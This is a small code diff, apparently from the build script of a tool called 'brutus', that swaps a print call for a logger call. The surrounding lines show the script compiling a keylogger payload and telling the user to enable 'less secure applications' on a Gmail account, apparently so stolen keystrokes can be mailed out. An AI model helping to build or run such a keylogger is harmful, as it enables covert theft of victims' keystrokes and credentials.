@@ -82,7 +82,7 @@ def run() -> None:
                     'brutus.payloads.keylogger.Keylogger',
                 ]
             )
-        print('\n')
+        LOGGER.info('')
         LOGGER.info(f'successfully compiled to {filename}')
         LOGGER.info(
             'you must allow \'less secure applications\' in provided Gmail account'
